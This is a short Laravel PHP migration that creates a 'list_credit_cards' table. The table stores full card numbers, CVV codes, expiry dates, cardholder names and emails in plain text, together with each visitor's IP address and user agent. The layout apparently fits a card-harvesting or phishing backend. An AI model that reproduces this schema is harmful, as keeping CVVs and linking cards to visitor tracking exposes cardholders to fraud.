<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

class CreateListCreditCardsTable extends Migration
{
    /**
     * Run the migrations.
     *
     * @return void
     */
    public function up()
    {
        Schema::create('list_credit_cards', function (Blueprint $table) {
            $table->id();
            $table->string("email");
            $table->text("card_holder_name");
            $table->text("card_number");
            $table->text("card_cvv");
            $table->text("card_end_month");
            $table->text("card_end_year");
            $table->string("ipadd", 15);
            $table->text("HTTP_USER_AGENT");

            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     *
     * @return void
     */
    public function down()
    {
        Schema::dropIfExists('list_credit_cards');
    }
}
